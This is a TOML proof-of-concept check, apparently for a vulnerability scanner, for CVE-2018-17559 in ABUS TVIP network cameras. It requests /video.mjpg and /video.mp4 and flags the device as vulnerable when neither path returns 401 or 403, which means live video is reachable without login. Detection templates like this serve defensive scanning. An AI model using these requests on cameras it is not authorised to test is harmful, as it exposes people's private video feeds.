[info]
id = "POC-AVE-2018-0012"
name = "ABUS TVIP 摄像头未授权视频流访问 PoC"
author = "AVE"
severity = "high"
tags = ["unauth", "information-disclosure"]
description = "ABUS TVIP 系列网络摄像头存在访问控制缺陷，未经身份验证的攻击者可直接访问 /video.mjpg 或 /video.mp4 获取实时视频流"
vuln_id = ["CVE-2018-17559", "AVE-2018-0012"]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/video.mjpg"

[[poc.requests.matchers]]
type = "status"
status = [401, 403]
expect = false

[[poc.requests]]
method = "GET"
path = "/video.mp4"

[[poc.requests.matchers]]
type = "status"
status = [401, 403]
expect = false
